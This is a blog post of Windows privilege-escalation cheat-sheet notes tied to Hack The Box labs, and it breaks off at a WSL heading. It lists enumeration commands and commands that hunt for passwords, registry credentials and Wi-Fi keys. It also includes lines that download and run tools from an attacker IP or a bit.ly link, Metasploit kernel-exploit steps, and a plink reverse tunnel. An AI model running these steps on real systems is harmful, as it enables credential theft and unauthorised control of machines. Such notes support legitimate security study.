---
layout: post
title: "windows privesc"
keywords: "windows, privesc, privilige escalation"
---

#### Resources

1. [https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources){:target="_blank"}
1. [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation){:target="_blank"}

#### System enumeration

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

hostname

wmic qfe get Caption,Description,HotFixID, InstalledOn
wmic logicaldisk get caption,description,providername
```

#### User enumeration

```
whoami
whoami /priv
whoami /groups

net user
net user <user>
net localgroup
net localgroup <group>
```

#### Network enumeration

```
ipconfig /all

arp -a

route print

netstat -ano
```

#### Password Hunting
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)

```
findstr /si password *.txt *.ini *.config

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

#### AV enumeration

```
sc query windefend
sc queryex type= service

netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

#### Automated Tools

1. Executables: [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS){:target="_blank"} / [Seatbelt]( https://github.com/GhostPack/Seatbelt){:target="_blank"} / [Watson](https://github.com/rasta-mouse/Watson){:target="_blank"} / [SharpUp](https://github.com/GhostPack/SharpUp){:target="_blank"}
1. Powershell: [Sherlock](https://github.com/rasta-mouse/Sherlock){:target="_blank"} / [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc){:target="_blank"} / [JAWS](https://github.com/411Hall/JAWS){:target="_blank"}
1. Other: [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester){:target="_blank"} / [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/){:target="_blank"}

```
> cmd /c powershell Invoke-WebRequest http://10.10.14.140/<file> -OutFile <file>

meterpreter > cd c:\\windows\\temp
meterpreter > upload /opt/winpeas/winPEAS.exe
meterpreter > shell
> winPEAS.exe

meterpreter > cd c:\\windows\\temp
meterpreter > upload /opt/PowerUp.ps1
meterpreter > shell
> powershell -ep bypass
powershell > Import-Module PowerUp.ps1
powershell > Invoke-AllChecks

> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”

meterpreter > run post/multi/recon/local_exploit_suggester
```
- https://recipeforroot.com/advanced-powerup-ps1-usage/
- https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
- https://www.hackingarticles.in/window-privilege-escalation-automated-script/

#### Kernel Exploits

Hack The Box: Devel

```
meterpreter > background
> use post/multi/recon/local_exploit_suggester
> set session 1
> run

[+] 0.0.0.0 - use exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated

> use exploit/windows/local/ms10_015_kitrap0d
> set session 1
> set lhost tun0
> set lport 4445
> run
```

#### Passwords & Port Forwarding

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

Hack The Box: Chatterbox

```
> whoami
> net users
> net user <user>

> reg query HKLM /f password /t REG_SZ /s
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

DefaultUserName    REG_SZ    <user>
AutoAdminLogon     REG_SZ    1
DefaultPassword    REG_SZ    *******
```

```
> sudo vim /etc/ssh/sshd_config
# Change PermitRootLogin prohibit-password to PermitRootLogin yes

> service ssh restart
> service ssh start
```

```
> netstat -ano
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4

# Download plink.exe (https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
>> certutil -urlcache -f http://10.10.14.51:8000/plink.exe plink.exe
>> plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.51 -v
>>> winexe -U Administrator%Welcome1 //127.0.0.1 "cmd.exe"
```

#### WSL (Windows Subsystem for Linux)

Hack The Box: SecNotes